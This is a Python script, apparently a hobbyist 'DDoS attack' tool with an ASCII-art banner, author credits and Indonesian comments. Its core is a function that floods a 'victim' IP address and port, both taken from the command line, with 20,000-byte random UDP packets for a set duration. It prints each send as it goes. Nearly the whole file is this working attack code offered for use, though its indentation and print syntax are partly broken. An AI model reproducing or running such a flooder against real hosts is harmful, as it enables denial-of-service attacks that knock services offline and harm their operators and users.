import time
import socket
import random
import sys
def usage():

print("""

\033[1;31m                      ..-------.`                      
\033[1;31m                `--::-..........-:::--`                
\033[1;31m             .-:-.`     ````````    `.-:-.             
\033[1;31m           -:-`      ````````````       .-:-           
\033[1;31m         -/.      ````           ````      -/.         
\033[1;31m       `/-     `.`      `` ```       `.      :/`       
\033[1;31m      `+.     ..         -.--         `.`     .+`      
\033[1;31m     `o`     .`   `     `:.+.      `    ..     `+      
\033[1;31m     +.     .`   `````  `///`      ``    .`     -/     
\033[1;31m     o./`:/`-    ````````./o-```` ```     - -:`-/o     
\033[1;31m    -: +`+/.`    ````...//+o//:.`````     -  +`/:+.    
\033[1;31m    :-   ``.`     ```.`-o////+/-`````     -  ` ``/-    
\033[1;31m    ./     `.      ``-`.+/+m+o:-.``       -      +`    
\033[1;31m     o      -       `-`.://ss+---`       `.      o     
\033[1;31m     ::     `.     ````...-:---..``     `-      /-     
\033[1;31m      /-     `.     `.```./--..--`     `.      :/      
\033[1;37m       /:     `.`   `````.:...```     ..      ::       
\033[1;37m        -/.     ````````  ``````    ```     ./-        
\033[1;37m```````` `::.      `````     ```````      .::`         
\033[1;37m           `-:-`       `````````       `-:-````````````
\033[1;37m.`            .-:.```   ````````  ```::-.             `
\033[1;37m ..`              `.--:::::-:::::--.`              `.``
\033[1;37m   ..`                                          `..`   
\033[1;37m     ..```````````````````````````````````````..`      

\033[1;31m ____                               ____  ____                    _   _   _   
\033[1;31m|  _ \  __ _ _ __   __ _  ___ _ __ |  _ \|  _ \  ___  ___        / \ | |_| |_ 
\033[1;31m| | | |/ _` | '_ \ / _` |/ _ \ '__|| | | | | | |/ _ \/ __|_____ / _ \| __| __|
\033[1;31m| |_| | (_| | | | | (_| |  __/ |   | |_| | |_| | (_) \__ \_____/ ___ \ |_| |_ 
\033[1;31m|____/ \__,_|_| |_|\__, |\___|_|___|____/|____/ \___/|___/    /_/   \_\__|\__|
\033[1;31m                   |___/      |_____|                                         
\033[1;31m            _    
\033[1;31m  __ _  ___| | __
\033[1;37m / _` |/ __| |/ /
\033[1;31m| (_| | (__|   < 
\033[1;31m \__,_|\___|_|\_\

""")

print("""

\033[1;31m Author   : Garuda12cyber
\033[1;31m Gmail    : garuda12cyber@gmail.com
\033[1;37m github   : https://github.com/Garuda12cyber

""")



def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
